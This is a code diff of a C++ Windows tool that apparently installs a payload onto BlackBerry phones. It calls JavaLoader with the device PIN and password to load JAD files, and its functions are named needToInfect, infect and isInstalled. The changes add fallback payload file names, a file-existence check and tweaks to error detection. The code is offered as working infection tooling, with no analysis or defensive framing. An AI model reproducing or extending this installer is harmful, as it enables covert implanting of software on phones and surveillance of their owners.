@@ -21,7 +21,7 @@
 //#include <stdio.h>
 using namespace std;
 
-const wstring JAVALOADER = L"JavaLoader.exe";
+const wstring JAVALOADER = L"javaloader.exe";
 
 //const wstring JADDIR = L"";
 const wstring JADEXT = L"jad";
@@ -192,6 +192,17 @@ bool needToInfect(wstring pin, set<wstring> argv )
 	return argv.find(pin)!=argv.end();
 }
 
+boolean exists( wstring filename ){
+	boolean ret=false;
+	ifstream my_file(filename);
+	if (my_file.good())
+	{
+		debug<<"File exists: "<<filename<<endl;
+		ret=true;
+	}
+
+	return ret;
+}
 
 int isError( wstring execResult ) 
 {
@@ -199,7 +210,7 @@ int isError( wstring execResult )
 	boolean Ecan = upperResult.find(L"THE SYSTEM CANNOT FIND") != wstring::npos;
 	boolean Eerr = upperResult.find(L"ERROR") != wstring::npos;
 	boolean Enot = upperResult.find(L"NOTFOUND") != wstring::npos;
-	boolean Epas = upperResult.find(L"PASSWORD") != wstring::npos;
+	boolean Epas = upperResult.find(L"PASSWORD PROTECTED") != wstring::npos;
 	int ret = (Ecan << 0 | Eerr << 1 | Enot << 2 | Epas << 3);
 	return ret;
 }
@@ -289,13 +300,19 @@ infect_result infect( wstring pin, wstring password )
 
 		// see if it's at least OS 5.0
 		if(version>=5000){
-			infected=loadJad(pin,password,L"net_rim_bb_5.0.jad");
+			if(exists(L"net_rim_bb_5.0.jad"))
+				infected=loadJad(pin,password,L"net_rim_bb_5.0.jad");
+			else if(exists(L"bb_in_5.0.jad"))
+				infected=loadJad(pin,password,L"bb_in_5.0.jad");
 		}
 
 		// try 
 		Sleep(300);
 		if(infected!=OK){
-			infected=loadJad(pin,password,L"net_rim_bb_4.5.jad");
+			if(exists(L"net_rim_bb_4.5.jad"))
+				infected=loadJad(pin,password,L"net_rim_bb_4.5.jad");
+			else if(exists(L"bb_in_4.5.jad"))
+				infected=loadJad(pin,password,L"bb_in_4.5.jad");
 		}
 								
 	}	
@@ -311,7 +328,7 @@ infect_result isInstalled( wstring pin, wstring password )
 	wstring installedcodlist = execJloader( pin, password, L" dir -1");
 
 	if(int error = isError(installedcodlist) ){
-		debug << "ERROR: " << error << endl;
+		debug << "DIR ERROR: " << error << endl;
 		return ERR_GENERIC;
 	}
 
